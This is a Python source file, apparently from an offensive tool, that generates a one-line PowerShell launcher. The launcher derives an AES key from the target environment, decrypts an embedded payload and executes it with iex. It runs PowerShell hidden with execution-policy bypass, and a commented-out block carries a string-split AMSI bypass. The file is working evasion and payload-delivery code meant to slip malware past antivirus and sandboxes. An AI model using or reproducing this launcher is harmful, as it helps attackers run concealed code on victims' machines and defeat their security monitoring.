#! /usr/bin/python3

class pshTemplate:
    def pshTemplate(self, encrypted, varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, funcDecryptString, query, asmi, exitcmd):
        # Get the initial key value
        setKey = varKey + " = (" + query + ");"
        # Repeat that key until it is over 32 bytes long
        setKey += varCtr + " = 1; While (" + varKey + ".length -lt 32){" + varKey + "=" + varKey + "*"+varCtr+";"+varCtr+"++}; "
        # Trim it to exactly 32 bytes for AES256
        setKey += varKey + " = (" + varKey + ".subString(0, [System.Math]::Min(32, " + varKey + ".Length))); "
        # Base64 encode it
        setKey += varBytes + " = [System.Text.Encoding]::UTF8.GetBytes(" + varKey + "); " + varKey + " =[Convert]::ToBase64String("+varBytes+");"

        # Using Tabs to keep code looking nice in source, but removing tabs to create a one-liner at the end
        decrypterBlob = '''
        function '''+funcCreateAesManagedObject+'''(''' + varKey + ''', $IV) {
            '''+varAesManaged+''' = New-Object 'System.Security.Cryptography.AesManaged';
            '''+varAesManaged+'''.Mode = [System.Security.Cryptography.CipherMode]::CBC;
            '''+varAesManaged+'''.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
            '''+varAesManaged+'''.BlockSize = 128;
            '''+varAesManaged+'''.KeySize = 256;
            if ($IV) {
                if ($IV.getType().Name -eq 'String') {
                    '''+varAesManaged+'''.IV = [System.Convert]::FromBase64String($IV)
                }
                else {
                '''+varAesManaged+'''.IV = $IV
                }
            }
            if (''' + varKey + ''') {
                if (''' + varKey + '''.getType().Name -eq 'String') {
                    '''+varAesManaged+'''.Key = [System.Convert]::FromBase64String(''' + varKey + ''')
                }
                else {
                    '''+varAesManaged+'''.Key = '''+varKey+'''
                }
            }
            '''+varAesManaged+'''
        }

        function '''+funcDecryptString+'''('''+varKey+''', '''+varencryptedStringWithIV+''') {
            '''+varBytes+''' = [System.Convert]::FromBase64String('''+varencryptedStringWithIV+''');
            $IV = '''+varBytes+'''[0..15];
            '''+varAesManaged+''' = '''+funcCreateAesManagedObject+''' '''+varKey+''' $IV;
            '''+varDecryptor+''' = '''+varAesManaged+'''.CreateDecryptor();
            '''+varUnencryptedData+''' = '''+varDecryptor+'''.TransformFinalBlock('''+varBytes+''', 16, '''+varBytes+'''.Length - 16);
            '''+varAesManaged+'''.Dispose();
            [System.Text.Encoding]::UTF8.GetString('''+varUnencryptedData+''').Trim([char]0)
        } '''+varLauncher+''' = ('''+funcDecryptString+''' '''+ varKey

        # Run Powershell command
        psCmd = '''
        powershell.exe -w 1 -exec bypass -nop -c "'''

        # AMSI Bypass PoC - Replace this with something more modern if you'd like
        #if amsi:
    	#    amsiBypass = '''
        #[Ref].Assembly.GetType('System.Management.Automatio'+'n.AmsiUtils').GetField('amsiInitFai'+'led','NonP'+'ublic,Static').SetValue($null,$true);
        #'''
        #else:
    	#    amsiBypass = ''

        # Build the PS code to run with an IEX block at the end
        spotter = psCmd + setKey + decrypterBlob + " '" + encrypted + "'); try{iex "+varLauncher+"} catch{" + exitcmd + '}"'
        # Remove any line breaks and tabs to get a one-liner
        spotter = spotter.replace("\n", "")
        spotter = spotter.replace("\t", "")
        spotter = spotter.replace("    ", "")
        print(spotter)
